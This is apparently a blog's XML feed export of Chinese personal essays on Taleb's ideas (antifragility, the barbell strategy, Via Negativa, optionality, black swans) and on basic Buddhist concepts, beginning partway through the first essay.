它把一件事的所有可能结果列举出来，并且对应每个结果用一个数表达它发生的可能性。考虑分布，叫我们在高度随机的事物面前考虑各种可能性，并根据每种可能的权重进行决策而非过度倾向某个选项。真正依据分布函数进行思维是很难的一件事，因为我们的大脑的天性是把一些可能无限放大另一些无限缩小，这些往往和我们的心情和刚刚收到的信息有关。比如常见的如果一个新闻刚刚播放了飞机事故，很多人就不敢做飞机，因为心理放大这种事情的概率。</p><p>复杂系统的分布函数决定其性质而非平均数，对这个问题我在<a href="https://link.zhihu.com/?target=http%3A//rrurl.cn/hzxA7Q" target="_blank" rel="noopener">高斯与天鹅</a>里已经进行了很详尽的描述。用一句话说，就是幂律函数统治复杂系统。而幂律函数里面极端事件的发生具有比高斯分布大得多的概率。</p><p><img src="/2018/06/05/反脆弱-纳西姆/幂律.jpg" alt=""></p><p><img src="/2018/06/05/反脆弱-纳西姆/高斯函数.jpg" alt=""></p><p><strong>幂律的大头和长尾是它的标志，而高斯是大肚。高斯的性质取决于肚子，而幂律则同时决定于大头和长尾。</strong></p><p><strong>针对此点的方法论：抓大放小。</strong></p><p><img src="/2018/06/05/反脆弱-纳西姆/高斯分布和幂律的立体表示.jpg" alt="img"></p><p><strong>高斯分布和幂律分布的立体表示，你能分出哪个是高斯哪个是幂律吗？左高斯右幂律（转自反脆弱作者尼古拉的博客）</strong></p><p>我们只要管理某些对系统产生核心影响的事件，而对其它事件放任，让自然来管理，就可经营好复杂系统。</p><p>这里一个典型的例子是以色列的反恐。据说以色列是唯一宣称容忍小型恐怖袭击的国家（当然不是不管），因为以色列的小型恐怖袭击太多了，人们就是在排除小型炸弹中生活的。而以色列巨大的反恐力量旨在消除超大规模的恐怖袭击（加沙的导弹）。因为恐怖袭击是一个典型的幂律分布事件，极端恐怖袭击的危害（911）占决定影响。以色列成功的把幂律变成了高斯，该国几十年没有大规模恐怖袭击（好于中国），而国内人民享受着相当的自由（特拉维夫是亚洲同性恋的都会）。</p><p>抓大放小，就是在能量有限的情况下，你要是把精力太多放在微小因素，就无暇顾及核心因素。而微小因素往往会在恰当时候自发解决（比如一些不重要考试前夜的疯狂补习）。所谓古人所说的无为而至，也就是大自然早已给我们设计好的节能优化模型，把一些事情交给自然，剩下的事情才可以尽力到底。</p><p><strong>在复杂系统面前，否定即肯定。否则最坏的，就是积极的了。</strong>一个很有意思的例子是民主制， 民主制选上的领导往往是混蛋（不胜枚举了，一下台就成阶下囚）。但是民主的好处是让混蛋不做太坏的事（比如发动文化大革命），而不是做好事。 中国的悲剧不是没有贤君，而是制度无法抑制全盘毁灭性的破坏事件，因而无法积累。</p><p>把握复杂系统，让它朝着人为意志方向往往不可能甚至适得其反，但是否定一些最坏的东西却往往是切实可行的。<strong>例如在选择配偶上，每个人都该问的是，你最不能接受的是对方做什么？</strong> 如果这恰恰是对方无法避免会做的，就可以确定不该在一起。至于其它的小坏却可以置之不理。</p><p><strong>黄金法则4：以无常对无常 你的变化速度要超越世界</strong></p><p><strong>复杂性告诉你的，世界是高速变化的，而且这种变动往往是无序和不可预测的。如果你想跟着世界变化，你永远是落后的。</strong>因为当变化的趋势路人皆知的时候，也是趋势将要变化，新一轮无常开始要肆虐的时候（看看股市）。因此，个体面对环境变化的随机性，要主动寻求变化，要以动制动，在运动中搜索信息，调整步幅。</p><p><strong>自然界应对无常环境进行的一种典型运动方式是小范围的改变（试错），如果得来不利的反馈信息，就快速做出一系列大幅度的调整，直到达到一个比较有利的位置，这样的变动周而复始。</strong>我想这是对无常一种最佳的适应方法。如果环境丰饶，则不失良机。反之，又不至于因过分执著于不够好的机会而被困死。</p><p>一个典型的例子是鲨鱼觅食。鲨鱼在鱼类丰富的环境进行小步伐的随机游走，只要不停的游动不停止就可以吃到最多的鱼。但当鱼类相对不足的时候。鲨鱼就会进行大步伐的跃迁。这种跃迁也是随机的，却具备一次改变较大的特点。 小步伐的随机游走比较容易穷尽开采一个地方的资源， 但不容易到达较远的地点，而大步伐的跃迁却有利开发新的领地，寻找新的食物来源。</p><p>自然环境-对于生物来说就是食物分布，最大的特点就是不均匀，要么大量来（自助餐），要不就没有（大饥荒）。而这种变动往往不可预测。这就是为什么鲨鱼会选择这样的觅食策略。</p><p><strong>总结性的观点： 宇宙具有波动性，是无常的。你最好的方式是自身的具备宇宙的这种性质。稳定是不存在的，稳定只存在于波动中，稳定只存在于噪声之上。</strong></p><p>还用原书的一个例子：饥饿的驴。驴子又饿又渴，前面是一条河，后面是草原，但是都要跋涉一公里。它犹豫不决，就好像二里平衡下的物体，死路一条。这个时候，唯一能够解救它的是随机的走一步。结果朝哪里近，就去哪里。 <strong>这就是随机运动的美妙，整个宇宙都可以理解为在随机运动下导致对称破缺（有序产生）的过程。</strong></p><p>这已经涉及到我的研究课题，又对所有类型的决策问题有启发，以后有机会再述。</p><p><strong>超越一切的黄金法则：杠铃策略 - 风险对冲</strong></p><p><strong>前面谈的策略都是比较消极被动的，好了，现在到我们主动出击，反向利用“无常”和分布函数进行获利的时候了。</strong></p><p>什么是杠铃： 两头重，中间轻，其实它就是无常的化身-幂律函数的缩影。幂律的特点第一是“大头”一个是“长尾” ， 大头是较高频率，但影响微小的事件，而长尾则是较低频率，但对系统产生重大影响的黑天鹅（积分发散）。</p><p><strong>杠铃策略，就是叫我们同时把握大头和长尾，利用分布函数获利。其实这和我们传统的中庸恰恰相反，中庸法则叫我们远离极端，而对冲确是利用两个极端的综合博弈实现平衡。</strong></p><p>以下分述弱杠铃策略，仅仅利用分布函数的形状的策略，和强杠铃策略（杠杆原理），利用复杂系统的非线性动力学。</p><p><strong>弱杠铃法则：风险组合</strong></p><p>最简单的应用莫过于高风险和低风险事件的组合。比如一个人先有一个稳定的职业在去做一些高风险的投资。</p><p><strong>人是无法承担无限风险的，在一个领域的风险，总要另一个领域吸收</strong>。如果你找一个风情万种的法国美女做老婆，你总要承担被戴绿帽子的风险，你就不得不找一个特别稳定的职业赚钱，看好她防备各种风险。相反找了吕后那样稳定持家的老婆，你就可以在事业上挥霍挥霍冒点险，因为总有个安稳的后方。所以聪明要成大事的人不会追求一些极端的美女的。</p><p>比如你要做一件有压力的大事，就需要一些特别傻瓜的爱好让你能够在工作之余能够吸收进去，那个大事和无聊的爱好恰好是哑铃的两端，你绝不会像我一样写这个文章， 既累又没压力。</p><p>另一个典型的例子是如果生活特别枯燥，比如常和数字打交道，就更需要做一些疯狂的事情释放，看看华尔街之狼就明白了。</p><p><strong>总之当你人生从事的事业中包含了从具有相反极端属性的事情，你就可以在风向逆转的时候通过对杠铃另一端的拥抱得到解救。</strong></p><p>杠铃法则的另一个典型应用是人的知识结构，最有效的知识结构亦呈现幂律分布，专一的技术是头，广博的知识是尾，专一技术是人立足江湖的必杀技，但是在很多特殊的关键时候，广博的知识又起决定作用。在巨大的未知性面前，光有专一的技术往往是脆弱的，就像溺水的电脑专家决定他命运的不是电脑技能而是是否会水。</p><p>幂律之所以广泛存在，也在于起自身结构具有符合造物法则的反脆弱性。好比历史总是由少数杰出人物引领而多数人民提供基础，光有个别英雄或者人民都难以发展。</p><p><strong>强杠铃法则-杠杆原理： 风险对冲</strong></p><p>我从金融上的对冲基金得到启发，提高一个较强版本的杠铃法则-对冲法。前面的风险组合强调互补，而风险对冲则强调相反相成。简而言之，就是一种事物的风险，恰恰构成另一钟事物的机遇。杠铃一端的损失就是另一端的收益，当一端向下，另一端恰好向上。好比跷跷板，好比杠杆。聪明人利用这个杠杆，把生活中向下的波动转成成向上波动的契机。</p><p>对冲的根本基础其实是事物的非线性，如果你同时买入分布两端的事物，而这两个事件又存在反向关联（当A下降，B有上升趋势, 或反之），最关键的是这种关联又是非线性的（A的下降不等于B的上升，下降总是小于上升），一端一个小的下降总会引起另一个端较大的提升。</p><p><img src="/2018/06/05/反脆弱-纳西姆/凹凸函数.jpg" alt=""></p><p><strong>图为非线性的最简单描述，凹函数和凸函数。凹函数f(A+B)<f(a)+f(b)（左），凸函数f(a+b)>f(A)+f(B)（右）. 如果哑铃两端的事物具有凸函数的关联性，即A的减弱引起B的上升，B的减弱引起A的上升，并且两种变化的和呈上升趋势，那么同时吃入这两种事物，我们就实现了风险对冲，或者说反脆弱性。因为在任何情况下你获利的期望都为正。</f(a)+f(b)（左），凸函数f(a+b)></strong></p><p>让我们看看对冲基金是怎么操作的，对冲者同时买入一个行业内较优和较略的几只股票的卖空期货（当股票的跌幅大于预期，就收益），这就是我说的占据分布的两端。当行情见长，较优股票的收益将大于较略股票卖空的赔损，而当行情见跌，略等股的卖空收益将高于优等股下跌的损失。从而实现风险对冲。</p><p><strong>如果你发现一对具有反向相关性的事物，而且这种相关性具有凹函数性质，你就可以做一笔好买卖，因为凹函数在波动中受益的本性。</strong></p><p>一些生活中的例子，失恋和官场失意培养文学家。如果李白成了宰相，那肯定没有千年的文学泰斗，而多了一个我们不知道的唐朝宰相。你失眠的时候你就博览群书你成了有智慧的人，你事业不顺找一大堆朋友喝酒叫了一大堆好友结果一起创业成功了，你被女友甩了结果发起facebook泡更多妹还成了扎克伯格。</p><p><strong>我可以做一个大胆的推测，我们这个世界记住的所有成功者都是通过某种杠铃对冲成就的。</strong></p><p><strong>懂得在生活中使用对冲法则的人从不会焦虑或者为任何事情沮丧，无论是失恋还是创业失败，因为你永远不知道上帝明天为你准备了什么，只要你自己不对生活说no。</strong></p><p><strong>这也是为什么我认为丰富广博比专于一处好，因为要利用杠铃法则，你实际动用的是你浑身的全部知识和爱好，所有的积累，如果你没有料，只有一种技术，你就是个一头重的杠铃，只有在自由落体中显身了</strong>。</p><p><strong>最后引用尼古拉原著的第一句话：风会熄灭蜡烛，却能使火越烧越旺。</strong></p><p><strong>附记：</strong></p><p><strong>归零思维：</strong></p><p>我觉得有一个一般的规律，人拥有的越多就越害怕失去，进入一种守成心态，而这正是人的脆弱性增加的时候。因为你在风险中可以丢失的东西往往多于你在随机性中的获益，想想一艘盛满财宝在风雨飘摇中的船。 而相反的情况是，当你位置较低的时候，向下空间有限而向上空间很大，波动性造成的平均收益为正。想想那些一无所有的人，往往无所畏惧：所谓奴隶可以丢掉的只有枷锁。当然这不是说都去当乞丐。起码把自己的心态置零，是有帮助的。<strong>如同Steven Jobs 说的， Stay Hungry, Stay Foolish….</strong></p><p><strong>博览群书</strong></p><p>博览群书是最佳的获取反脆弱性的方法。因为恰当的使用杠铃策略直接取决于你知识的广度。但是不是书呆子的死读书，而是好读书不求甚解。要的是恰当的把握一类事物的轮廓和精要而非死缠烂打。因此最好的是每一种学科都进行了解，但并非读那种特别有深度的书。例如去了解哲学没有必要读完一本纯粹理性批判。 你的专业除外。</p><p><strong>宗教是处理复杂性特别有效的工具</strong></p><p>我们这个世界存在从古代世界存活至今的理念，其实都是具有反脆弱性的，或者说在随机性打击中得到自我强化，一个最典型的例子是宗教。当你信教的时候，你经受挫折，会觉得神在考验你，还需要坚持。当你叫了好运，会觉得这是上帝的恩惠，而更加强了信仰。因此无论向上波动还是向下波动，信仰都得到增强。因此宗教成为这个世界从古至今不灭的火。 科学观念则相反，一种观念总有其存在寿命，当一个科学理念遇到一个反例，它的终极就到了。我觉得一个好的宗教，起最大的意义在于让人远离魔鬼而非找到那个唯一的真神。或者如果你远离了魔鬼，你离真神也已经不远，这也是为什么宗教是处理复杂性特别有效的工具。</p><p><strong>宽以待人，有容乃大</strong></p><p>我们古典美德的宽以待人，其实也体现了反脆弱性。因为宽容别人，有容乃大，即使自己不都是占便宜的那个，造成的损失往往在较长时间上看什么都不算。但是不宽容别人或斤斤计较所造成的损失，或因此失掉的机会，往往是致命的（我们这个时代一个信息就可以致人生死）。因此宽容和博大的气度，具有很高的反脆弱性。</p><p><strong>实用理想主义</strong></p><p>杠铃法则之一应用就是实用主义和理想主义的结合。 最优秀的理想主义者，往往要奉行最强大的实用主义原则。或者理想和实用就是杠铃的两端。</p><p>懂得杠铃主义的人会把一些事情用最大的实用主义解决，而剩下就可以无忧无虑的搞理想。比如大学考试，对于无心学术圈的人很多课程只是用来羞辱他们的手段而非知识。那么他们如果能够巧妙的把成绩控制在60，就比努力得到80分聪明。因为一旦大学结束，他们用60分换来的“其它技能”恰恰会帮他们做到他们想做的事情。</p>]]></content>
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Nassim Nicholas Taleb-纳西姆</title>
      <link href="/2018/05/30/Nassim%20Nicholas%20Taleb-%E7%BA%B3%E8%A5%BF%E5%A7%86/"/>
      <url>/2018/05/30/Nassim%20Nicholas%20Taleb-%E7%BA%B3%E8%A5%BF%E5%A7%86/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Nassim Nicholas Taleb（NNT）</p><p><strong>NNT的精髓是“求知” - Epistemology</strong></p><p>NNT是一个什么样的人？</p><p><strong>黎巴嫩名门之后</strong>：父母的家族都是显赫的政治和学术世家；<br><strong>自学成才(Autodidact)</strong>：虽然他有很高的学历，但年轻时代痴迷的是古典著作而不是数理统计，据他自己讲，数理统计主要都是自学的。<br><strong>多语言掌握者(Polyglot)</strong>：能讲法语，英语，阿拉伯语，西班牙语，意大利语；至少还能额外看懂古希腊语，拉丁语，亚拉姆语，古希伯来语；<br><strong>成功的，不按常理出牌的交易员(Doer)</strong>：20出头开始做交易员，靠自己的研究成功：1987年市场崩盘时，27岁的NNT就已经实现财务自由。他为交易者提供黑天鹅事件的保护，在最近的数十年每次的大崩盘他都赚了大钱。<br><strong>癌症康复者</strong>：NNT在90年代患上喉癌，在自己研究的支持下康复。 畅销书作家：Fool by randomness与The Black Swan，不必多讲。他还有一本自己写的谚语书The Bed of Procrustes，当然还有大作Antifragile。<br><strong>学者</strong>：全职教授，无数客座教授；<br><strong>阅读狂人</strong>：从13岁起，每周读书30到60小时； </p><p>上述标签中最重要的两个，是Autodidact和Doer。第一他不是传统系统里的学者，第二他不是只讲不做，靠嘴皮子吃饭的Charlatan。（NNT说，听任何人讲理论，你要看他是不是敢对讲话的内容付私人的财富上的责任，这叫做Skin in the Game，如果不是，那他的理论要打巨大的折扣。） </p><p>现在来说Epistemology。求知，这很难写，因为他所提出过和谈到过的各种理念，如Narrative Fallcy，Problem of Induction，The Unknown Unknown，Ludic Fallcy，Skepticism，The Turkey Problem，Bed of Procrustes，Via Negativa，Asmmetry of Information，The Black Swan，Optionality，The Fourth Quadrant，Barbell Strategy，Convexivity和Antifragility都是他求知方式的剥夺，而且这些概念互相联系。要在一篇文章中说清楚，一是我没这个水平，二是这会剥夺同学们跟随他进行思维飞行的乐趣。所以在这里我想以举例的形式来介绍一下NNT的求知过程，把大家谈得比较少的概念讲一讲，那就是Via Negativa, or the negative way。</p><p>Via Negativa是神学的一个理念，跟随这个理念的教义并不试着解释神是什么，而主要解释神<strong>不是什么</strong>。举个例子来说明，知乎上有很多人来问过我，投资是什么，PE是什么，能不能用一句话解释。这是效率很低的做法，对于提问者来讲，其实最有价值的问题是，投资<strong>不是什么</strong>。</p><p>为什么？因为负面的信息远远比正面的信息有力量。比如，一个想知道投资是什么的人，其实是想知道进了投资界会不会比较自由，有没有一夜暴富的机会，能不能变成高帅富开超跑泡女模。那么你只需要知道投资界大多数人的生存状态，就能做出正确的决定，比听这个人说说投资方法论，那个人说说投资心得，第三个人八一八海天盛宴要准确得多，有效率得多。这也是”黑天鹅“的由来：如果要证明“世界上所有的天鹅都是白的”这个假设，即使做了数十年的统计和研究都难以下定论。但只要发现一只黑天鹅，那就可以即刻证伪该假设。</p><p>把这个概念和求知联系起来，可以得到一个重要原则：在求知上，<strong>做减法比做加法更有效率</strong>：一个真正的好医生，不会告诉你去干这个去干那个，而是告诉你不该干这个不该干那个。一个好的有用的理论，不是有很多假设和条件来告诉你达到这些条件你就能做什么，而是<strong>告诉你，你不能做什么</strong>。或者<strong>告诉你，你至少做到些什么以后，不会犯大错。</strong>或者我换个方式来讲：“<strong>负面的建议即使有很多条都会有用，但正面建议必须少才有用</strong>”。所以下一次你请咨询公司的时候或者听上级的建议的时候，问问他们，你们最不希望我做什么。</p><p>以Via Negativa作为出发点，加上NNT关于不可预测性的论述，就可以得到如何在不可预知的世界生存的方法：Barbell Strategy。以BarBell的眼光看世界，就可以看到如何主动打造出Optionality，最后成功实现Antifragile：既然世界不可知，那么就让这些不可知对我们有利吧！</p><hr><p>NNT所谈的Antifragile的概念是这样的：</p><p>想象你寄一箱子马克杯到一个地方去，你一定能够会在箱子上写：“易碎，请小心搬运。”为什么？因为一箱子马克杯从一个地方运到另一个地方，比如说用飞机吧，如果出现什么颠簸和一场，对马克杯的可能的影响只有一种，那就是“破碎”或者“破损”，这就是易碎的本意。</p><p>NNT说，不是的，易碎（Fragile）的反义词是Antifragile，是这样一种状态，处于Antifragile状态的物件，受到越多的波动反而会越变越好。举个例子，你具有一种倾向，越被人打就越健康，所以你为了健康就天天跑出去骚扰别人找打，因为这样会让你越来越好。</p><hr><p>Optionality是整本书的核心，也是制造Antifragile最重要的手段。</p><p>NNT从金融出发得到这个概念，而能够不局限于金融，将这个概念引申和发展到现实的方方面面，他说<em>Education without eruditon is noting</em>不以博学为目的教育是毫无价值的。</p><p>讲个故事吧：</p><p>有一对兄弟，国内同一所·大学毕业后，老大到500强制造业做管培生，老二和一帮朋友一起创业。</p><p>三年后，老大一切顺利，任职质管总监，年薪来到50万，五年内可以看到100万，正在和差不多条件的白富美恋爱，准备结婚；老二和朋友们一起搞的团购网站已经关门，赔掉20万，现在正准备搞一个手游公司二次创业，是没女人理的屌丝一枚；家里面的妈妈着急死了，要老大去劝弟弟找个工作稳定下来，老大和老二谈了以后告诉妈妈：”让他干吧，他迟早比我混的好，我还准备投资他的新公司呢。“老妈一听，跳起来就问为什么？老大脑袋被驴踢了吗？</p><p>老大说：‘妈，你有没有想过，虽然我现在是「500强」公司的质管总监，看起来可能很稳定很风光。但我们这种制造企业，一旦经济形势不好，客户订单下降；或者工人工资上升，总部要转移加工能力到印度，像这种中层很容易被开除的。开了以后还不容易找到下家。要是我们都困难，其他行业就跟糟糕了。这种时候我该怎么办？虽然老二第一次创业失败，但他的团队还能给他一起干第二次，我就觉得相当了不起。他们几个兄弟分担创业成本，每个人再拿出30万出来就可以了，做不好大不了30万全输光，但做好了，少说挣回来十倍百倍，往多说那回报可是没有上限。我现在投资支持他，对我可是再划算不过的，我连时间都不用投入，这30万与其拿去花掉，还不如花钱买一个分享弟弟未来成功的权利！“</p><p>故事中老大说的这种<strong>付出可承担的和成本，获得不成比例的可能回报</strong>的情况，就是生活中的Option。</p><p>NNT如此定义：</p><p><strong>Option=Asmmetry+Rationality</strong>，也就是“结果的不对称性”+“选择有利自身的结果的能力”。</p><p>故事中的老大认为，支持自己弟弟创业，自己最多付出的代价是30万，而可能获得的回报是“十倍百倍甚至没有上限”，这就是“<strong>结果的不对称性</strong>”。同时自己并不用去判断弟弟做的好还是不好，做的好的手游公司赚钱，谁都看的出来，这就是“<strong>选择有利自身的结果的能力</strong>”。</p><p>其实这就是<strong>天使投资</strong>和<strong>孵化器</strong>的逻辑。天使投资者完全没有必要花太多的精力去研究自己所投的公司的前景如何，研究是没有用的，因为没有初创公司能按照自己第一天的计划去成功。初创公司不成功，客户数量，收入，访问量，A轮投资者自然会告诉天使，天使不存在判断错误的可能。而天使所付出的投资成本和投资回报之间的倍数，可以是<strong>2万倍</strong>（Facebook）。</p><p>Paul Granam，Y Conbinator的创始人，一年前写过一篇文章叫<em>Black Swan Framing</em>，讲的就是这个道理。他意识到，在孵化器阶段去做关于公司是否会成立的标准<strong>不仅仅是无效的，更可怕的是这种做法是有害的！</strong>（建议对风险投资感兴趣的都去读读他的文章，非常反传统但是非常的有道理：<a href="http://www.paulgraham.com/swan.html" target="_blank" rel="noopener">Black Swan Framing</a>）</p><p>一旦获得了这种Option，请大家想一想，是不是就不担心风险和额外变量了？因为额外的变量和风险不可能影响对选择不利的结果（最多输30万），而只会影响对选择有利的结果（盈利倍数无上限）。这种Optionality，就是建立Antifragile的基石。</p><hr><p>“获得高额倍数收益的风投”毕竟是少数，也有人对这样的策略能否行得通表示怀疑。其实这里有一个道理，Taleb称为：“Payoff matters more than probability.”（回报额远比概率重要）</p><p>讲个故事：某二级市场基金，每年都以盈利和亏损额作为标准会对旗下的投资经理进行排名。某年，对过去5年的排名进行一次研究，发现一个现象。基金旗下的明星经理（排名前20%）的平均盈利机会与排名后80%的一般经理的平均盈利机会大致雷同，都在50%上下（可见long equity这个行业……）但是，明星经理的盈利总和是其他经理盈利总和的好几倍！这是如何做到的呢？</p><p>原因在于Payoff：明星经理赚大钱，输小钱；其他经理赢小钱，输大钱。</p><p>这个故事我觉得说明了两个意思。第一，投资上巴老怎么说的？不要输钱，永远记住不要输钱。为什么这么说呢？因为投资的项目只有两种，一种输钱，一种赚钱。而如果投资者能时刻的注意风险，做到不输钱，或者不输大钱，那就立于不败之地了。因为利润就交给运气好碰上的赚大钱的项目就好了。第二，大众对于“极端”事件出现的概率和相应影响的估量都太低，我在PE/VC行业观察到的事实就是，好项目虽然难得，但最开始的一两个好项目通常就能建立一个基金品牌。你叫得上名字的VC/PE莫不若是。</p><p>所以，不要老是去想着：“我怎么才能找到好的项目？”而是首先要想：“我怎么才能不投坏项目？”第二个问题要回答的优先级远远高于第一个问题。芒格说：“invert,always invert.”此乃实际范例。请记住：“Payoff matter more than probability.”，不仅仅是投资，做任何事情都是这样。</p>]]></content>
      
      <categories>
          
          <category> Peoplel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>黑天鹅</title>
      <link href="/2018/05/14/%E9%BB%91%E5%A4%A9%E9%B9%85/"/>
      <url>/2018/05/14/%E9%BB%91%E5%A4%A9%E9%B9%85/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在发现澳大利亚的黑天鹅之前，欧洲人认为天鹅都是白色的，“黑天鹅”曾经是欧洲人言谈与写作中的惯用语，用来指不可能存在的事物，但这个不可动摇的信念随着第一只黑天鹅的出现而崩溃。<br>黑天鹅的存在寓意着不可预测的重大稀有事件，它在意料之外，却又改变一切。人类总是过度相信经验，而不知道一只黑天鹅的出现就足以颠覆一切。然而，无论是在对股市的预期，还是政府的决策中，黑天鹅都是无法预测的。“9·11”事件、美国的次级贷危机、我国的雪灾，都是如此。<br>生活中，随机性随处可见，在资本市场也是一样。人们总是以自己有限的生活经验和不堪一击的信念来解释不可预测的事件；即便是精于算计的专业人士，也难保不被随机性愚弄，其实我们应该做的是顺应这种不可知的未来。本书会教你改变自己的思维方式，把握黑天鹅带来的机会，采取应对策略，从中受益。这本书将改变我们对世界、人性和金钱的看法。<br>大约在四百年前，弗朗西斯·培根就曾经发出这样的警告：当心被我们自己思想的丝线丝丝束缚。但是我们老是犯这种错误，老是以为过去发生过的事情很有可能再次发生，所以免不了会凭经验办事。比如说，我们经常编出简单的理由或故事来解释我们尚不知晓（而很有可能是我们根本就不可能知道的）复杂的事情。举个简单的例子：我们无法预知在未来的某一天股市会涨还是会跌，据以推断预测的理由要么过于简单化了，要么根本就是错误。事实上，真正重大的事件是无法预知的，Nassim Nicholas Taleb把这称之为“黑天鹅”。作者的这一论点，对于那些靠预测经济发展为业的MBA甚至曾获得过诺贝尔奖的专家们而言，可以说是沉重的一击。这在 Nassim Nicholas Taleb已经不是第一次了，在他的上一部作品《被随意性愚弄》（曾被翻译成十九种语言出版，是当年的最畅销书之一）一书中，就曾发出这种声音。而今在《黑天鹅》中，他把重点进一步聚焦在自然科学最无所作为的一点——预知未来。并非只有华尔街才需要预测未来，事实上我们每个人都常常有意无意地做预测—— 当你决定买保险的时候，或者系上安全带的时候，等等。<br>“黑天鹅”有着高度不可能事件所应具备的三个特征：第一点是不可预知性；第二点是它所带来的影响是巨大的；第三点是，在此之后，人们总是试图编造理由来作解释，好让整件事情看起来不是那么的随意就发生了，而是事先能够被预测到的——通过这样那样的分析。Google公司所取得的惊人的成功就是这样的一只“黑天鹅”，美国9·11事件也是。对于Nassim Nicholas Taleb而言，黑天鹅无处不在，几乎是世界上任何事情的基础——从宗教的兴起到我们每个人的私生活。<br>那么，为什么在黑天鹅被发现之 前，没有人去设想一下其他颜色的天鹅也有可能存在呢？Nassim Nicholas Taleb 给出的答案是：在应该关注共性的时候，人类错误地关注着特性，反之亦然。受思想的束缚之害，我们总是习惯于重视已知的事物，而忘记了去想想为什么有那么多其他的事物我们还不了解。多年来，Nassim Nicholas Taleb一直致力于研究人性的弱点之一，就是自欺欺人的——我们以为自己知道的很多，而事实上我们真正知道的东西很少。在许多大事件陆续发生并改变着我们的世界的时候，我们却还像鸵鸟一样把头埋在沙堆中，禁锢着自己的思想。因此，我们总是习惯于将事物作简单的归类处理，一味将可能性比较小的概率事件归结为不可能那一类，也就难怪会有那么多“黑天鹅”出现了。然而，Nassim Nicholas Taleb毫不留情地指出：历史不是徐徐行进的，而是活蹦乱跳式的。从以往的事件中归纳总结妄图加以解释的做法，不过是为了获得心理上的满足和安慰感罢了，谈不上任何实用性。比如说9·11，比如说股票市场的突然大跌甚至股灾。<br>在《黑天鹅》这一堪称具有革命性意义的书中， Nassim Nicholas Taleb研究了高度不可能事件以及不可预期事件的强大的影响力，相当精彩且极具启发性——它很有可能改变你看待这个世界的方式——好多我们自以为非常清楚确定的事情，在看过《黑天鹅》之后你会发现实际上我们一无所知。但是也不必悲观，作者同时还告诉了我们对付“黑天鹅”的诀窍，处理得当的话还有可能变被动为主动，甚至从中获益。运气、不确定性、可能性以及认知，是Nassim Nicholas Taleb穷其一生研究的问题，其自然科学、经济学以及统计学背景，在《黑天鹅》中表现得淋漓尽致，驾驭起来显得游刃有余。不仅如此，Nassim Nicholas Taleb还是一位懂得娱乐的作家，文字一如既往地延续了其探索性的随意风格，充满着智慧、调侃和戏谑。可以说，是Nassim Nicholas Taleb成就了《黑天鹅》，而《黑天鹅》本身就是一只“黑天鹅”。<br><a id="more"></a></p>]]></content>
      
      <categories>
          
          <category> 随想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>佛祖都讲了些什么</title>
      <link href="/2018/03/30/%E4%BD%9B%E7%A5%96%E9%83%BD%E8%AE%B2%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88/"/>
      <url>/2018/03/30/%E4%BD%9B%E7%A5%96%E9%83%BD%E8%AE%B2%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><p>“下辈子”“有缘”“报应”都是来自于佛教<br>“老天爷”既不是佛教概念，也不是道教概念，这是一个早在佛教和道教出现之前，中国本土就有的概念：认为“天”是一个有意志、无所不能的管理者。<br>既然“天”能管理一切，那么也就可以决定凡人的一生，所以才有了“命运”的说法。<br>佛教不认为有“天”，那么自然，也就不认为由“天”来制定“命运”。佛教主张因果报应，认为一个人遭遇的事情是由他之前的行为导致的“报应”，而不是外在的“命运”决定的。<br>所以，佛教反对宿命论。<br>【所以与命运有关的，算命，转运都是与佛教无关的】</p><p>黄巾民变的大漏洞<br>谶chen<br>中国最早的佛教庙宇是汉明帝十七建立的“白马寺”<br>之所以叫“寺”，是因为“寺”是汉时政府机构的名称。比如“太常寺”“太仆寺”“鸿胪寺”，都是政府部门。“白马寺”在汉明帝时期，就是个专门接待外国僧人的政府机构。<br>中国古人相信人死后会变成鬼。王充在《论衡》里质问说：如果人人死后都变成鬼，拿过去死去的人累积起来千千万万，现在应该全世界满坑满谷都是鬼才对。那为什么凡是见到的都只有一两只鬼呢。<br>王充又问，如果人死后灵魂变成鬼，那衣服没有灵魂吧，时间长了衣服就腐烂了。那为什么人们声称见到的鬼，都是穿着人的衣服呢？<br>王充仅仅从最简单的逻辑，就推理出中国神鬼说的荒谬之处。<br>佛教在传入中国以前，已经在印度发展了数百年，拥有了完备的理论。<br>儒家倡导“三纲五常”。<br>中国大部分王朝，都坚持用儒家的思想来治国，因为儒家道德比宗教更加好用。<br>儒家道德的最大优势在于，人们对于道德的认同是发自内心的。</p><p>佛教故弄玄虚还是遵守逻辑？</p><p>“天地不仁，以万物为刍狗”——“天地没有仁慈之心，万物对于老天来说，都是一样的”<br>“道法自然”——“人法天，地法天，天法道，道法自然”——“人效法地，地效法天，天效法道，道就是最终的真理啊”</p><p>佛教体系非常复杂，但佛教最基础的理论却极为简单，总结成两条：<br>万事万物都是因为一定的原因产生的。<br>在佛教里，“原因”的术语叫“因缘”。<br>佛剑简化“万法缘起”【辩证唯物主义】</p><p>假设“万法”指世间一切事物，因此这个本源也属于“万法”。又因为“万法缘起”，所以这个本源还有一个产生它的原因。那么这个本源就不是本源。于是可证：这个世界没有本源。</p><p>“万法缘起”还有一个重要的推论：既然一切事物都是随缘而起，那就是说，这些事物不能脱离因缘而存在。只有适当的因缘在适当的时候出现了，都凑齐了，相应的事物才出现。等因缘消失了，事物也就随着消失。</p><p>也就是说，桌子依赖于外界条件，才能存在，能不能存在，不是桌子自己说的算。这在哲学上，叫做“不能自存”。在佛教上，叫做“没有自性”。用佛教语言说：“法无自性”——意思是世间万物都不能脱离因缘独立存在。<br>万物不能自存，也就是说，万物都是随着因缘的聚散而不断变化生灭的，因此没有永恒存在的事物。<br>事物一直处于变化的状态中，不能永恒存在